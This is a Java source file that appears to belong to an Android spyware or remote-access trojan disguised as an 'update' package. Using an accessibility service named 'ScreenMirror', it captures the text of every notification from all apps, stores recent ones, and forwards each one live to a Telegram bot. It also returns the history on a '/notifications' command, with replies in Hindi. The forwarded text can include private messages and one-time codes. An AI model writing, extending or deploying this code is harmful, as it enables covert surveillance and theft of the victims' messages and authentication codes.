package com.kasari.update;

import android.view.accessibility.AccessibilityEvent;
import java.text.SimpleDateFormat;
import java.util.*;

/**
 * Captures all notification events via the AccessibilityService (ScreenMirror).
 * Called from ScreenMirror.onAccessibilityEvent().
 */
public class NotificationCatcher {

    private static final int MAX_HISTORY = 50;
    private static final List<String> mHistory = new ArrayList<>();

    public static void onEvent(AccessibilityEvent event) {
        if (event == null) return;
        if (event.getEventType() != AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) return;

        CharSequence pkg = event.getPackageName();
        List<CharSequence> texts = event.getText();
        if (texts == null || texts.isEmpty()) return;

        String text = texts.get(0).toString().trim();
        if (text.isEmpty()) return;

        String ts = new SimpleDateFormat("HH:mm dd-MM", Locale.getDefault()).format(new Date());
        String entry = "[" + ts + "] [" + (pkg != null ? pkg : "?") + "] " + text;

        synchronized (mHistory) {
            mHistory.add(entry);
            if (mHistory.size() > MAX_HISTORY) mHistory.remove(0);
        }

        // Live forward to Telegram
        new Thread(() -> TelegramController.sendMessage("🔔 Notification\n" + entry)).start();
    }

    // Called by /notifications command
    public static void sendRecent() {
        List<String> copy;
        synchronized (mHistory) { copy = new ArrayList<>(mHistory); }
        if (copy.isEmpty()) {
            TelegramController.sendMessage("📭 Koi notification nahi (abhi tak).");
            return;
        }
        int start = Math.max(0, copy.size() - 20);
        StringBuilder sb = new StringBuilder("🔔 Last " + (copy.size() - start) + " Notifications:\n\n");
        for (int i = start; i < copy.size(); i++) sb.append(copy.get(i)).append("\n");
        TelegramController.sendMessage(sb.toString());
    }
}
